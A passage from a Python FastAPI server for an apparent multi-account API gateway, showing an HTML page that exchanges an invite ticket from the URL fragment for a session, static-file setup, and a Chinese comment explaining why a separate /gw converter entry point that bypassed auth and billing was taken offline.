<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<meta name="referrer" content="no-referrer">
<title>正在验证</title>
<style>
  html,body{height:100%;margin:0}
  body{display:flex;align-items:center;justify-content:center;
       font:14px/1.6 -apple-system,"Segoe UI","Microsoft YaHei",sans-serif;
       color:#5b6270;background:#f5f6f8}
  .box{text-align:center;padding:28px 32px;background:#fff;border-radius:14px;
       box-shadow:0 8px 30px rgba(16,24,40,.08);max-width:320px}
  .spin{width:22px;height:22px;margin:0 auto 12px;border:2px solid #e3e6ec;
        border-top-color:#4b6ef5;border-radius:50%;animation:r .8s linear infinite}
  @keyframes r{to{transform:rotate(360deg)}}
</style></head>
<body>
<div class="box">
  <div class="spin" id="spin"></div>
  <div id="msg">正在验证访问链接…</div>
</div>
<script>
(function () {
  "use strict";
  function fail() {
    var s = document.getElementById("spin");
    if (s) s.style.display = "none";
    document.getElementById("msg").textContent = "链接已失效，请向管理员重新索取。";
  }
  var m = (location.hash || "").match(/^#k=(.+)$/);
  if (!m) { fail(); return; }
  var ticket = "";
  try { ticket = decodeURIComponent(m[1]); } catch (e) { fail(); return; }
  // 先把 fragment 从地址栏抹掉：即便后续请求失败，票据也不再留在历史记录里。
  try { history.replaceState(null, "", location.pathname); } catch (e) {}
  fetch("/api/join/ticket/exchange", {
    method: "POST",
    credentials: "same-origin",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ ticket: ticket })
  }).then(function (r) {
    if (!r.ok) { fail(); return; }
    location.replace("/join");
  }).catch(fail);
})();
</script>
</body></html>"""


@app.get("/j", include_in_schema=False)
def join_bootstrap():
    return HTMLResponse(_JOIN_BOOTSTRAP_HTML,
                        headers={"Cache-Control": "no-store, no-cache, must-revalidate",
                                 "Referrer-Policy": "no-referrer"})


import mimetypes
# Windows registry MIME mappings can override JS/CSS and fail under nosniff.
for _suffix, _mime in {".js": "application/javascript", ".css": "text/css", ".svg": "image/svg+xml"}.items():
    mimetypes.add_type(_mime, _suffix)
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# ============================================================================
# /gw 内嵌 converter 网关 —— **已下线**
# ============================================================================
#
# 历史：这里曾把 `converter.app` 挂到 `/gw`，作为「单端口同时提供主网关 +
# 兼容网关」的入口。但它是一条**并行的第二入口**：
#
#   · 它读的是**桌面端登录文件**（`%LOCALAPPDATA%\CodeBuddyExtension\...\*.info`），
#     而不是本服务的账号池 —— 等于绕开选号、倍率、冷却、风控全部逻辑；
#   · 它的鉴权只看 `CONVERTER_API_KEY`，与主网关的 `api_keys` 表完全独立，
#     配错/漏配就是一条对外的白嫖通道；
#   · 它和 `/v1` 的计费、日志口径都不一样，面板上看到的账与真实消耗对不上。
#
# 结论：**不挂载**。所有流量只走 `/v1/*`（多平台网关），口径统一、可审计。
# `converter.py` 仍保留（`main.py` 独立运行时可能用到），只是不再内嵌进本服务。
if _CONVERTER_EMBEDDED:
    logging.getLogger("admin.server").info(
        "/gw 未挂载（内嵌 converter 网关已下线，所有流量走 /v1）")